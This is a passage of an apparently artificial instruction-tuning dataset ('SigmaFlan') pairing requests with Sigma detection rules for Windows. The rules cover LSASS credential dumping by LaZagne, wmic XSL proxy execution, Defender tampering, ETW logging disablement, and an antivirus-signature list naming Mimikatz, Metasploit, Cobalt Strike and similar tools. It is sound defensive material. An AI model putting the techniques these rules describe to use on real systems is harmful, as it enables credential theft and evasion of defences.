      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\'\n        TargetObject|endswith:\n            - '\\Internet'\n            - '\\LocalIntranet'\n            - '\\MyComputer'\n            - '\\TrustedSites'\n            - '\\UntrustedSites'\n        Details: 'Enabled'\n    condition: selection\nfalsepositives:\n    - Legitimate internal requirements.\nlevel: medium\n",
      "question": "changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet.",
      "answer": "In order to detect changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet, you should monitor Windows Registry settings specifically for \"SetValue\" events. Focus on changes made under the `\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\` path with particular attention to any modifications ending with '\\Internet', '\\LocalIntranet', '\\MyComputer', '\\TrustedSites', or '\\UntrustedSites'. The critical detail to look for is the 'Enabled' status in these registry settings. These changes might signal an attempt to lower security measures and facilitate installations from less secure or trusted locations. However, be aware that some legitimate internal requirements might necessitate such modifications, leading to possible false positives. The severity of this detection is considered medium, emphasizing its importance without suggesting it signals an immediate and critical threat. Understanding these modifications can play a crucial role in identifying potential security risks associated with the weakening of ClickOnce trust prompts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc), you should monitor Windows images loaded for occurrences when `wmic.exe` is executed in conjunction with either `jscript.dll` or `vbscript.dll`. These libraries are indicative of script execution which can be an attempt to execute arbitrary JavaScript or VBScript code through wmic's ability to process XSL files. However, note that not all instances where `wmic.exe` loads `vbscript.dll` or `jscript.dll` are malicious. For example, legitimate commands like `wmic os get lastboottuptime` or `wmic os get locale`, which also load `vbscript.dll`, should not be considered indicators of this attack. Consequently, to mitigate potential false positives and gain further insight into the context of the `wmic.exe` execution, it's advisable to investigate related process creation events, command line arguments, and the parent-child process relationships. This approach ensures a more accurate determination of whether the activity is malevolent, especially since the sole image load event data may not provide sufficient context.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        ImageLoaded|endswith:\n            - '\\jscript.dll'\n            - '\\vbscript.dll'\n    condition: selection\nfalsepositives:\n    - The command wmic os get lastboottuptime loads vbscript.dll\n    - The command wmic os get locale loads vbscript.dll\n    - Since the ImageLoad event doesn't have enough information in this case. It's better to look at the recent process creation events that spawned the WMIC process and investigate the command line and parent/child processes to get more insights\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        ImageLoaded|endswith:\n            - '\\jscript.dll'\n            - '\\vbscript.dll'\n    condition: selection\nfalsepositives:\n    - The command wmic os get lastboottuptime loads vbscript.dll\n    - The command wmic os get locale loads vbscript.dll\n    - Since the ImageLoad event doesn't have enough information in this case. It's better to look at the recent process creation events that spawned the WMIC process and investigate the command line and parent/child processes to get more insights\nlevel: medium\n",
      "question": "threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc).",
      "answer": "In order to detect threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc), you should monitor Windows images loaded for occurrences when `wmic.exe` is executed in conjunction with either `jscript.dll` or `vbscript.dll`. These libraries are indicative of script execution which can be an attempt to execute arbitrary JavaScript or VBScript code through wmic's ability to process XSL files. However, note that not all instances where `wmic.exe` loads `vbscript.dll` or `jscript.dll` are malicious. For example, legitimate commands like `wmic os get lastboottuptime` or `wmic os get locale`, which also load `vbscript.dll`, should not be considered indicators of this attack. Consequently, to mitigate potential false positives and gain further insight into the context of the `wmic.exe` execution, it's advisable to investigate related process creation events, command line arguments, and the parent-child process relationships. This approach ensures a more accurate determination of whether the activity is malevolent, especially since the sole image load event data may not provide sufficient context."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting wscript/cscript executions of scripts located in user directories.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect wscript/cscript executions of scripts located in user directories, you should look for the creation of processes on Windows systems that manifest a specific pattern in their execution. These processes are initiated by the Windows Script Host engines, wscript.exe or cscript.exe, indicating the use of Windows scripting. The identifiers to watch out for include these engines launching scripts present within either 'C:\\Users\\' or 'C:\\ProgramData\\' directories.\n\nMoreover, the command lines initiating these processes may have references to file types like .jse, .vbe, .js, .vba, or .vbs, which are all script formats that can potentially be used for malicious purposes when executed in such a context. This combination of factors\u2014script host engines executing scripts from user directories in specific script formats\u2014is indicative of suspicious activity potentially related to scripting attacks.\n\nHowever, it's crucial to consider exceptions to rule out false positives effectively. If the process lineage (ParentImage) includes utilities like Winzip or other self-extractors, which might legitimately execute scripts as part of their operation, such instances should not be considered malicious.\n\nThe data crucial for this analysis includes the CommandLine and ParentCommandLine, which provide context on how and why a particular script is being executed. Being vigilant about such process creation events is critical, although it's also necessary to be aware of common benign software operations (like those involving Winzip) to avoid misinterpreting legitimate activities as threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        CommandLine|contains:\n            - 'C:\\Users\\'\n            - 'C:\\ProgramData\\'\n    selection2:\n        CommandLine|contains:\n            - '.jse'\n            - '.vbe'\n            - '.js'\n            - '.vba'\n            - '.vbs'\n    falsepositive:\n        ParentImage|contains: '\\winzip'\n    condition: selection1 and selection2 and not falsepositive\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Winzip\n    - Other self-extractors\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        CommandLine|contains:\n            - 'C:\\Users\\'\n            - 'C:\\ProgramData\\'\n    selection2:\n        CommandLine|contains:\n            - '.jse'\n            - '.vbe'\n            - '.js'\n            - '.vba'\n            - '.vbs'\n    falsepositive:\n        ParentImage|contains: '\\winzip'\n    condition: selection1 and selection2 and not falsepositive\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Winzip\n    - Other self-extractors\nlevel: high\n",
      "question": "wscript/cscript executions of scripts located in user directories",
      "answer": "In order to detect wscript/cscript executions of scripts located in user directories, you should look for the creation of processes on Windows systems that manifest a specific pattern in their execution. These processes are initiated by the Windows Script Host engines, wscript.exe or cscript.exe, indicating the use of Windows scripting. The identifiers to watch out for include these engines launching scripts present within either 'C:\\Users\\' or 'C:\\ProgramData\\' directories.\n\nMoreover, the command lines initiating these processes may have references to file types like .jse, .vbe, .js, .vba, or .vbs, which are all script formats that can potentially be used for malicious purposes when executed in such a context. This combination of factors\u2014script host engines executing scripts from user directories in specific script formats\u2014is indicative of suspicious activity potentially related to scripting attacks.\n\nHowever, it's crucial to consider exceptions to rule out false positives effectively. If the process lineage (ParentImage) includes utilities like Winzip or other self-extractors, which might legitimately execute scripts as part of their operation, such instances should not be considered malicious.\n\nThe data crucial for this analysis includes the CommandLine and ParentCommandLine, which provide context on how and why a particular script is being executed. Being vigilant about such process creation events is critical, although it's also necessary to be aware of common benign software operations (like those involving Winzip) to avoid misinterpreting legitimate activities as threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting network connections and DNS queries initiated by Regsvr32.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect network connections and DNS queries initiated by Regsvr32.exe, you should: focus on analyzing DNS query logs from Windows operating systems. Specifically, look for events where the image path ends with '\\regsvr32.exe', indicating that Regsvr32.exe is initiating these connections or queries. Important fields to monitor in this context include the computer name, the user account involved, the exact image path, and the destination IP and port numbers related to the activities. Although there may be rare instances where legitimate uses of Regsvr32.exe could trigger this detection, such cases are generally considered unknown and thus, the alert level for this behavior is classified as high. This detection is closely associated with tactics and techniques like Execution, Command and Control, and Defense Evasion, reflecting the malicious use of Regsvr32.exe to bypass security mechanisms, execute code, and establish connections to control servers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: dns_query\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regsvr32.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - Image\n    - DestinationIp\n    - DestinationPort\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: dns_query\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\regsvr32.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - Image\n    - DestinationIp\n    - DestinationPort\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "network connections and DNS queries initiated by Regsvr32.exe",
      "answer": "In order to detect network connections and DNS queries initiated by Regsvr32.exe, you should: focus on analyzing DNS query logs from Windows operating systems. Specifically, look for events where the image path ends with '\\regsvr32.exe', indicating that Regsvr32.exe is initiating these connections or queries. Important fields to monitor in this context include the computer name, the user account involved, the exact image path, and the destination IP and port numbers related to the activities. Although there may be rare instances where legitimate uses of Regsvr32.exe could trigger this detection, such cases are generally considered unknown and thus, the alert level for this behavior is classified as high. This detection is closely associated with tactics and techniques like Execution, Command and Control, and Defense Evasion, reflecting the malicious use of Regsvr32.exe to bypass security mechanisms, execute code, and establish connections to control servers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect SyncAppvPublishingServer process execution which is usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Monitor Windows PowerShell script logs, ensuring that Script Block Logging is enabled to capture detailed logging information. Look specifically for any instances where 'SyncAppvPublishingServer.exe' is mentioned within the ScriptBlockText field of the logs. This particular process execution is known to be a method used by attackers to circumvent PowerShell execution restrictions. While monitoring for this activity, be aware that legitimate App-V clients might also trigger detections as they can use 'SyncAppvPublishingServer.exe' in non-malicious contexts, thus these instances should be considered as potential false positives. The severity level for this detection is considered medium, indicating a balance between the need for vigilance and the expected occurrence of false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'SyncAppvPublishingServer.exe'\n    condition: selection\nfalsepositives:\n    - App-V clients\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: 'SyncAppvPublishingServer.exe'\n    condition: selection\nfalsepositives:\n    - App-V clients\nlevel: medium\n",
      "question": "SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.",
      "answer": "In order to detect SyncAppvPublishingServer process execution which is usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Monitor Windows PowerShell script logs, ensuring that Script Block Logging is enabled to capture detailed logging information. Look specifically for any instances where 'SyncAppvPublishingServer.exe' is mentioned within the ScriptBlockText field of the logs. This particular process execution is known to be a method used by attackers to circumvent PowerShell execution restrictions. While monitoring for this activity, be aware that legitimate App-V clients might also trigger detections as they can use 'SyncAppvPublishingServer.exe' in non-malicious contexts, thus these instances should be considered as potential false positives. The severity level for this detection is considered medium, indicating a balance between the need for vigilance and the expected occurrence of false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the \"systeminfo\" command to retrieve information.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage of the \"systeminfo\" command to retrieve information, you should: Monitor the creation of processes on Windows systems, focusing on any process where the image name ends with '\\systeminfo.exe' or the original file name is identified as 'sysinfo.exe'. The detection of these particular process creations is a sign that the \"systeminfo\" command may be being used. This technique is associated with obtaining system information, which can be indicative of reconnaissance activity. The level of certainty for this detection is considered low, implying that while these indicators can suggest suspicious activity, they are not definitive proof of malicious behavior alone and could result in unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\systeminfo.exe'\n        - OriginalFileName: 'sysinfo.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\systeminfo.exe'\n        - OriginalFileName: 'sysinfo.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "usage of the \"systeminfo\" command to retrieve information",
      "answer": "In order to detect the usage of the \"systeminfo\" command to retrieve information, you should: Monitor the creation of processes on Windows systems, focusing on any process where the image name ends with '\\systeminfo.exe' or the original file name is identified as 'sysinfo.exe'. The detection of these particular process creations is a sign that the \"systeminfo\" command may be being used. This technique is associated with obtaining system information, which can be indicative of reconnaissance activity. The level of certainty for this detection is considered low, implying that while these indicators can suggest suspicious activity, they are not definitive proof of malicious behavior alone and could result in unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll, you should: Look for modifications within the Windows Registry specifically targeting the setting values. Monitor registry events categorized under the setting changes, particularly focusing on those with the EventType of SetValue. The attention should be on changes made to the TargetObject ending with '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'. You need to be vigilant for modifications detailed as either 'DWORD (0x00000000)' or 'DWORD (0x00000002)', which represent the action of disabling or disabling with exceptions, respectively. This analysis is predicated on observations in the Windows environment, specifically noting registry modification events. The tagging relevant to this activity encompasses tactics and techniques such as Persistence, Privilege Escalation, and Defense Evasion by manipulating the registry to disable critical logging functions. Be aware that detections based on this method are categorized at a low level due to the potential unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'\n        Details:\n            # This is disabled by default for some reason\n            - 'DWORD (0x00000000)' # Off\n            - 'DWORD (0x00000002)' # Off with exceptions\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'\n        Details:\n            # This is disabled by default for some reason\n            - 'DWORD (0x00000000)' # Off\n            - 'DWORD (0x00000002)' # Off with exceptions\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll",
      "answer": "In order to detect changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll, you should: Look for modifications within the Windows Registry specifically targeting the setting values. Monitor registry events categorized under the setting changes, particularly focusing on those with the EventType of SetValue. The attention should be on changes made to the TargetObject ending with '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'. You need to be vigilant for modifications detailed as either 'DWORD (0x00000000)' or 'DWORD (0x00000002)', which represent the action of disabling or disabling with exceptions, respectively. This analysis is predicated on observations in the Windows environment, specifically noting registry modification events. The tagging relevant to this activity encompasses tactics and techniques such as Persistence, Privilege Escalation, and Defense Evasion by manipulating the registry to disable critical logging functions. Be aware that detections based on this method are categorized at a low level due to the potential unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting LSASS process access by LaZagne for credential dumping..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect LSASS process access by LaZagne for credential dumping, you should look for process access activities in Windows operating systems that specifically involve accessing the Local Security Authority Subsystem Service (LSASS) executable. This detection focuses on instances where the LSASS executable is targeted, reflected by the end of the target image path '\\lsass.exe'. Additionally, the monitoring should check for a call trace that includes access from 'C:\\Windows\\SYSTEM32\\ntdll.dll', 'C:\\Windows\\System32\\KERNELBASE.dll', through '_ctypes.pyd', and involves 'python27.dll', indicating the use of Python, which is a common component of the LaZagne project utilized for extracting credentials. The access attempts should have a granted access level of '0x1FFFFF', which entails extensive permissions that could be abused for credential dumping. Such activities are considered critical due to their association with sensitive information theft.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        CallTrace|contains|all:\n            - 'C:\\Windows\\SYSTEM32\\ntdll.dll+'\n            - '|C:\\Windows\\System32\\KERNELBASE.dll+'\n            - '_ctypes.pyd+'\n            - 'python27.dll+'\n        GrantedAccess: '0x1FFFFF'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        CallTrace|contains|all:\n            - 'C:\\Windows\\SYSTEM32\\ntdll.dll+'\n            - '|C:\\Windows\\System32\\KERNELBASE.dll+'\n            - '_ctypes.pyd+'\n            - 'python27.dll+'\n        GrantedAccess: '0x1FFFFF'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "LSASS process access by LaZagne for credential dumping.",
      "answer": "In order to detect LSASS process access by LaZagne for credential dumping, you should look for process access activities in Windows operating systems that specifically involve accessing the Local Security Authority Subsystem Service (LSASS) executable. This detection focuses on instances where the LSASS executable is targeted, reflected by the end of the target image path '\\lsass.exe'. Additionally, the monitoring should check for a call trace that includes access from 'C:\\Windows\\SYSTEM32\\ntdll.dll', 'C:\\Windows\\System32\\KERNELBASE.dll', through '_ctypes.pyd', and involves 'python27.dll', indicating the use of Python, which is a common component of the LaZagne project utilized for extracting credentials. The access attempts should have a granted access level of '0x1FFFFF', which entails extensive permissions that could be abused for credential dumping. Such activities are considered critical due to their association with sensitive information theft."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of default named pipes used by the Koh tool.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect creation of default named pipes used by the Koh tool, you should: Monitor Windows systems for the creation of named pipes, focusing on those with specific names that include '\\imposecost' and '\\imposingcost'. This monitoring can be achieved by configuring logging for Named Pipe Events, particularly leveraging Sysmon's Event ID 17 and Event ID 18. It is essential to ensure that the logging for these events is properly configured, which might involve reviewing and potentially adjusting the Sysmon configuration according to templates found in well-regarded repositories such as those maintained by SwiftOnSecurity, Neo23x0, or Olafhartong. Additionally, detection efforts can be validated through testing mechanisms, such as using the PowerShell script available from SVCH0ST's guide on named pipes and Cobalt Strike pipe hunting. Given the specificity of the named pipes associated with the Koh tool, false positives are unlikely; however, any detection of pipe creation matching these criteria should be treated with a critical level of concern due to its association with malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: pipe_created\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|contains:\n            - '\\imposecost'\n            - '\\imposingcost'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: pipe_created\n    definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575'\ndetection:\n    selection:\n        PipeName|contains:\n            - '\\imposecost'\n            - '\\imposingcost'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "creation of default named pipes used by the Koh tool",
      "answer": "In order to detect creation of default named pipes used by the Koh tool, you should: Monitor Windows systems for the creation of named pipes, focusing on those with specific names that include '\\imposecost' and '\\imposingcost'. This monitoring can be achieved by configuring logging for Named Pipe Events, particularly leveraging Sysmon's Event ID 17 and Event ID 18. It is essential to ensure that the logging for these events is properly configured, which might involve reviewing and potentially adjusting the Sysmon configuration according to templates found in well-regarded repositories such as those maintained by SwiftOnSecurity, Neo23x0, or Olafhartong. Additionally, detection efforts can be validated through testing mechanisms, such as using the PowerShell script available from SVCH0ST's guide on named pipes and Cobalt Strike pipe hunting. Given the specificity of the named pipes associated with the Koh tool, false positives are unlikely; however, any detection of pipe creation matching these criteria should be treated with a critical level of concern due to its association with malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect chromium based browsers starting in headless and debugging mode and pointing to a user profile, which could be a sign of data stealing or remote control, you should: Monitor process creation events on Windows systems for the execution of commands that include all the following flags: `--remote-debugging-` (which indicates the initiation of debugging features that could be used for remote control), `--user-data-dir` (pointing towards the usage of a specific user profile, potentially indicating an attempt to access or steal data from this profile), and `--headless` (implying the browser is running in a mode without a graphical user interface, often used for automation but in this context could be for malicious purposes). The detection is considered highly reliable, but be aware that there might be unknown scenarios leading to false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            # Covers: --remote-debugging-address, --remote-debugging-port, --remote-debugging-socket-name, --remote-debugging-pipe....etc\n            - '--remote-debugging-'\n            - '--user-data-dir'\n            - '--headless'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            # Covers: --remote-debugging-address, --remote-debugging-port, --remote-debugging-socket-name, --remote-debugging-pipe....etc\n            - '--remote-debugging-'\n            - '--user-data-dir'\n            - '--headless'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control",
      "answer": "In order to detect chromium based browsers starting in headless and debugging mode and pointing to a user profile, which could be a sign of data stealing or remote control, you should: Monitor process creation events on Windows systems for the execution of commands that include all the following flags: `--remote-debugging-` (which indicates the initiation of debugging features that could be used for remote control), `--user-data-dir` (pointing towards the usage of a specific user profile, potentially indicating an attempt to access or steal data from this profile), and `--headless` (implying the browser is running in a mode without a graphical user interface, often used for automation but in this context could be for malicious purposes). The detection is considered highly reliable, but be aware that there might be unknown scenarios leading to false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential tampering with Windows Defender settings such as adding exclusion using wmic.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential tampering with Windows Defender settings such as adding exclusion using wmic, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the WMIC (Windows Management Instrumentation Command-line) utility, either referenced by its original filename 'wmic.exe' or any executable path ending with '\\WMIC.exe', is involved. Further scrutiny is required when the command line parameters include actions that modify the Windows Defender settings, notably accessing or altering configurations within the '/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender' directory. Any such activity should be flagged as suspicious with a high level of concern due to the rarity of legitimate use cases that involve direct manipulation of Windows Defender settings via WMIC, indicating a probable attempt at undermining the system's defense mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains: '/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains: '/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential tampering with Windows Defender settings such as adding exclusion using wmic",
      "answer": "In order to detect potential tampering with Windows Defender settings such as adding exclusion using wmic, you should: Monitor the creation of processes on Windows systems, specifically looking for instances where the WMIC (Windows Management Instrumentation Command-line) utility, either referenced by its original filename 'wmic.exe' or any executable path ending with '\\WMIC.exe', is involved. Further scrutiny is required when the command line parameters include actions that modify the Windows Defender settings, notably accessing or altering configurations within the '/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender' directory. Any such activity should be flagged as suspicious with a high level of concern due to the rarity of legitimate use cases that involve direct manipulation of Windows Defender settings via WMIC, indicating a probable attempt at undermining the system's defense mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting highly relevant Antivirus alert that reports a hack tool or other attack tool.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a highly relevant Antivirus alert that reports a hack tool or other attack tool, you should monitor antivirus logs for alerts that identify the presence of known hacking tools or attack tools. Specifically, look for signatures that start with 'HTOOL', 'HKTL', 'SecurityTool', 'Adfind', 'ATK/', 'Exploit.Script.CVE', 'PWS.', or 'PWSX'. Additionally, pay attention to signatures that contain the following strings: 'Hacktool', 'ATK/' (specifically noted for Sophos antivirus), 'Potato', 'Rozena', 'Sbelt', 'Seatbelt', 'SecurityTool', 'SharpDump', 'Sliver', 'Splinter', 'Swrort', 'Impacket', 'Koadic', 'Lazagne', 'Metasploit', 'Meterpreter', 'MeteTool', 'Mimikatz', 'Mpreter', 'Nighthawk', 'PentestPowerShell', 'PowerSploit', 'PowerSSH', 'PshlSpy', 'PSWTool', 'PWCrack', 'Brutel', 'BruteR', 'Cobalt', 'COBEACON', 'Cometer', 'DumpCreds', 'FastReverseProxy', and 'PWDump'.\n\nEnsure that for any detected alert, you collect at least the file name associated with the tool and the user account involved. Given the nature of these signatures, which are closely associated with intrusion tools and frameworks used in cyber attacks, it's highly unlikely that detections would be false positives. Such detections are critical for identifying potential breaches or unauthorized activities within a network, as they may involve attempts at privilege escalation, lateral movement, credential theft, or deploying additional payloads. This monitoring strategy aligns with MITRE ATT&CK tactics and techniques related to the use of credential access tools, discovery tools, defense evasion mechanisms, and execution techniques.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: antivirus\ndetection:\n    selection:\n        - Signature|startswith:\n            - 'HTOOL'\n            - 'HKTL'\n            - 'SecurityTool'\n            - 'Adfind'\n            - 'ATK/'\n            - 'Exploit.Script.CVE'\n            # - 'FRP.'\n            - 'PWS.'\n            - 'PWSX'\n        - Signature|contains:\n            - 'Hacktool'\n            - 'ATK/'  # Sophos\n            - 'Potato'\n            - 'Rozena'\n            - 'Sbelt'\n            - 'Seatbelt'\n            - 'SecurityTool'\n            - 'SharpDump'\n            - 'Sliver'\n            - 'Splinter'\n            - 'Swrort'\n            - 'Impacket'\n            - 'Koadic'\n            - 'Lazagne'\n            - 'Metasploit'\n            - 'Meterpreter'\n            - 'MeteTool'\n            - 'Mimikatz'\n            - 'Mpreter'\n            - 'Nighthawk'\n            - 'PentestPowerShell'\n            - 'PowerSploit'\n            - 'PowerSSH'\n            - 'PshlSpy'\n            - 'PSWTool'\n            - 'PWCrack'\n            - 'Brutel'\n            - 'BruteR'\n            - 'Cobalt'\n            - 'COBEACON'\n            - 'Cometer'\n            - 'DumpCreds'\n            - 'FastReverseProxy'\n            - 'PWDump'\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
